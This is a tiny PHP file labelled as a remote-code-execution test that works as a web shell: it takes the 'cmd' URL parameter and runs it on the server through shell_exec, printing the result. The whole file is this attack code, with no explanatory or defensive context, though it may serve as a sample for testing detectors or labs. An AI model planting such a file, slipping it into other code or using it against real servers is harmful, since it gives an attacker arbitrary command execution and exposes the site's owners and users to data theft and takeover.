<?php
// RCE test variation #2
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>